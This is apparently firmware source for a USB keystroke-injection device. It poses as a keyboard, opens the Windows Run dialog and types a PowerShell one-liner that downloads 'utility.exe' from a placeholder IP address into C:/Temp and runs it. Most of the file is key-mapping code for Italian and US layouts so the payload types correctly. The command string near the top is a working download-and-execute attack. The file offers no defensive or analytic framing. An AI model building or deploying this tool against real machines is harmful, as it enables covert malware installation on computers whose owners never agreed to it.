#include "USB.h"
#include "USBHIDKeyboard.h"

USBHIDKeyboard Keyboard;

enum KeyboardLayout {
    LAYOUT_IT,
    LAYOUT_US
};

KeyboardLayout currentLayout = LAYOUT_US;  // <<< change here to LAYOUT_US or LAYOUT_IT
const char* command = "powershell mkdir C:/Temp -Force; iwr http://XXX.XXX.XXX.XXX/utility.exe -OutFile C:/Temp/utility.exe; Start-Process C:/Temp/utility.exe";

void pressKey(uint8_t key) {
    Keyboard.press(key);
    delay(2);
    Keyboard.release(key);
    delay(2);
}

void pressShiftKey(uint8_t key) {
    Keyboard.press(KEY_LEFT_SHIFT);
    Keyboard.press(key);
    delay(5);
    Keyboard.releaseAll();
    delay(5);
}

void pressAltGrKey(uint8_t key) {
    Keyboard.press(KEY_RIGHT_ALT);
    Keyboard.press(key);
    delay(5);
    Keyboard.releaseAll();
    delay(5);
}

void typeAlphaNum(char c) {
    if (c >= 'a' && c <= 'z') {
        pressKey('a' + (c - 'a'));
    } else if (c >= 'A' && c <= 'Z') {
        pressShiftKey('A' + (c - 'A'));
    } else if (c >= '0' && c <= '9') {
        switch(c) {
            case '0': pressKey('0'); break;
            case '1': pressKey('1'); break;
            case '2': pressKey('2'); break;
            case '3': pressKey('3'); break;
            case '4': pressKey('4'); break;
            case '5': pressKey('5'); break;
            case '6': pressKey('6'); break;
            case '7': pressKey('7'); break;
            case '8': pressKey('8'); break;
            case '9': pressKey('9'); break;
        }
    } else if (c == ' ') {
        pressKey(' ');
    }
}

void typeSymbol(char c) {
    switch(currentLayout) {
        // ===== IT =====
        case LAYOUT_IT:
            switch(c) {
                case '-': pressKey('/'); break;              // US '/'
                case '_': pressShiftKey('/'); break;         // US '/' with SHIFT
                case '\'': pressKey('-'); break;             // US '-'
                case '?': pressShiftKey('-'); break;         // US '-' with SHIFT
                case '.': pressKey('.'); break;              // US '.'
                case ':': pressShiftKey('.'); break;         // US '.' with SHIFT
                case ',': pressKey(','); break;              // US ','
                case ';': pressShiftKey(','); break;         // US ',' with SHIFT
                case '@': pressAltGrKey(';'); break;         // US ';' with ALTGR
                case '\\': pressKey('`'); break;             // US '`'
                case '|': pressShiftKey('`'); break;         // US '`' with SHIFT
                case '+': pressKey(']'); break;              // US ']'
                case '*': pressShiftKey(']'); break;         // US ']' with SHIFT
                case ']': pressAltGrKey(']'); break;         // US ']' with ALTGR
                case '[': pressAltGrKey('['); break;         // US '[' with ALTGR
                case '!': pressShiftKey('1'); break;         // US '1' with SHIFT
                case '"': pressShiftKey('2'); break;         // US '2' with SHIFT
                case '$': pressShiftKey('4'); break;         // US '4' with SHIFT
                case '%': pressShiftKey('5'); break;         // US '5' with SHIFT
                case '&': pressShiftKey('6'); break;         // US '6' with SHIFT
                case '/': pressShiftKey('7'); break;         // US '7' with SHIFT
                case '(': pressShiftKey('8'); break;         // US '8' with SHIFT
                case ')': pressShiftKey('9'); break;         // US '9' with SHIFT
                case '=': pressShiftKey('0'); break;         // US '0' with SHIFT
            }
            break;

        // ===== US =====
        case LAYOUT_US:
            switch(c) {
                case '-': pressKey('-'); break;
                case '_': pressShiftKey('-'); break;
                case '/': pressKey('/'); break;
                case '?': pressShiftKey('/'); break;
                case '.': pressKey('.'); break;
                case ':': pressShiftKey(';'); break;
                case ',': pressKey(','); break;
                case ';': pressKey(';'); break;
                case '\\': pressKey('\\'); break;
                case '|': pressShiftKey('\\'); break;
                case '+': pressShiftKey('='); break;
                case ']': pressKey(']'); break;
                case '[': pressKey('['); break;
                case '=': pressKey('='); break;
                case '"': pressShiftKey('\''); break;
                case '\'': pressKey('\''); break;
                case '{': pressShiftKey('['); break;
                case '}': pressShiftKey(']'); break;                
                case '!': pressShiftKey('1'); break;
                case '@': pressShiftKey('2'); break;
                case '#': pressShiftKey('3'); break;
                case '$': pressShiftKey('4'); break;
                case '%': pressShiftKey('5'); break;
                case '&': pressShiftKey('7'); break;
                case '*': pressShiftKey('8'); break;
                case '(': pressShiftKey('9'); break;
                case ')': pressShiftKey('0'); break;
            }
            break;
    }
}

void typeText(const char *text) {
    for(int i = 0; text[i] != '\0'; i++) {
        char c = text[i];
        if ((c >= 'a' && c <= 'z') || 
            (c >= 'A' && c <= 'Z') || 
            (c >= '0' && c <= '9') || 
            c == ' ') {
            typeAlphaNum(c);
        } else {
            typeSymbol(c);
        }
    }
}

void setup() {
    USB.begin();
    Keyboard.begin();
    delay(1500); // wait for USB + system ready

    // open Run dialog (Win+R)
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    Keyboard.releaseAll();
    delay(500);

    typeText(command);

    Keyboard.press(KEY_RETURN);
    Keyboard.release(KEY_RETURN);
}

void loop() {
    // empty
}
